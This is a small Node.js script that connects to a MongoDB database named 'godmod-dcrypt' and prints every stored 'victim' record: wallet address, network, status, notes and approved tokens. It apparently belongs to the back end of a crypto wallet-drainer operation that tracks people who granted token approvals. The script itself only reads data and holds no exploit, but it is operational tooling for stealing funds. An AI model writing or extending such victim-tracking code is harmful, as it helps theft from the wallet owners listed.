const mongoose = require('mongoose');
require('dotenv').config();
const Victim = require('./src/models/Victim');

async function checkData() {
    try {
        // Use the explicit node.js connection string to bypass local DNS issues
        const mongoUri = process.env.MONGODB_URI;
        
        await mongoose.connect(mongoUri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            dbName: 'godmod-dcrypt',
            serverSelectionTimeoutMS: 15000 // Increase timeout for cloud connection
        });
        console.log('Connected to Atlas');

        const victims = await Victim.find({});
        console.log(`Found ${victims.length} victims:`);
        
        victims.forEach(v => {
            console.log(`- Address: ${v.address}, Network: ${v.network}, Status: ${v.status}`);
            console.log(`  Notes: ${v.notes}`);
            console.log(`  Approvals: ${JSON.stringify(v.approvedTokens)}`);
        });

        await mongoose.connection.close();
    } catch (error) {
        console.error('Error checking data:', error);
    }
}

checkData();
